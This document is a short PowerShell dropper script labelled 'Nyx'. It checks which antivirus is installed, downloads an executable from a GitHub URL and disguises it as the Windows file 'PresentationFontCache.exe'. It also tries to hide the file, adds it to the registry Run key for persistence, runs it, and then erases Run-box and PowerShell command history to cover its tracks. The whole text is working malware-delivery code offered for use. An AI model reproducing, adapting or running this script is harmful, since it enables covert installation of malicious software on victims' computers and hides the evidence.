# Nyx - B8XY4K5A

$Antivirus = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntivirusProduct

if ($Antivirus -and $Antivirus.displayName -ne "Windows Defender") {

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

} else {

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/B8XY4K5A/B8XY4K5A.exe -OutFile "$env:TEMP\B8XY4K5A\B8XY4K5A.exe"

# Change Nyx Name
Rename-Item -Path "$env:TEMP\B8XY4K5A\B8XY4K5A.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:TEMP\B8XY4K5A\B8XY4K5A.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "B8XY4K5A" `
-Value "$env:TEMP\B8XY4K5A\PresentationFontCache.exe"

# Run Nyx
& "$env:TEMP\B8XY4K5A\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
} 
